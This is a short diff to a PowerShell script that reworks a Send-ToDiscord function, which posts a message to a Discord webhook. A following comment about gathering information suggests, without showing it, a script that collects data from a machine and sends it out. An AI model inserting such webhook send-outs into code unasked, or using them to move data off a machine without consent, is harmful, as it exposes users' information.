@@ -328,19 +328,15 @@ function Send-ToDiscord {
         "content" = "```$Message```"
     } | ConvertTo-Json -Compress
 
-    # Define headers explicitly (optional but can help)
-    $headers = @{
-        "Content-Type" = "application/json"
-    }
-
-    # Use Invoke-RestMethod with explicit parameters
     try {
-        Invoke-RestMethod -Uri $DiscordWebhookUrl -Method "Post" -Headers $headers -Body $payload
+        # Invoke-RestMethod without the headers dictionary
+        Invoke-RestMethod -Uri $DiscordWebhookUrl -Method "Post" -ContentType "application/json" -Body $payload
         Write-Host "Data sent to Discord successfully."
     } catch {
         Write-Error "Failed to send data to Discord."
     }
 }
+
 
 
 # Main Script: Gather Information
